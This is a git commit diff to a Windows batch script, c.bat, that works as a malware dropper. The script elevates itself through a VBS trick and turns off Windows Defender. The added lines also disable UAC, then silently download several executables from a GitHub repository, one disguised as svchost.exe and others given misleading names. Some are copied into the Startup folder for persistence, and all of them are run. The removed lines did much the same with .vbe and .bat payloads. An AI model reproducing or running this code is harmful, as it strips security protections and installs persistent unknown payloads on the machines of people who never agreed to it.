6bc340a30bb1cef9d9752b4bcbe175435f56d5f3
DanGILC-137 <163125984+DanGILC-137@users.noreply.github.com>
2024-06-25 22:35:11 +0200

    Update c.bat

--- c.bat
+++ c.bat
@@ -7,11 +7,20 @@ echo objShell.ShellExecute "%~s0", "admin", "", "runas", 1 >> "%temp%\admin.vbs"
 "%temp%\admin.vbs"
 del /q "%temp%\admin.vbs"
 :run_as_admin
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-curl -s -o "scriptmenagers".vbe -JL "https://github.com/DanGILC-137/Legend/raw/main/scriptmenagers.vbe"
-curl -s -o "msisettings".bat -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.bat"
-start /min wscript.exe "scriptmenagers.vbe"
-cls
+@echo off
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+curl -s -o "WindowsBootMenager".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/WindowsBootMenager.exe"
+xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+WindowsBootMenager.exe
+curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
+xcopy /y chromedrivers.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+chromedrivers.exe
+curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
+svchost.exe
+REM curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
+REM xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+REM installer.exe
 exit
 
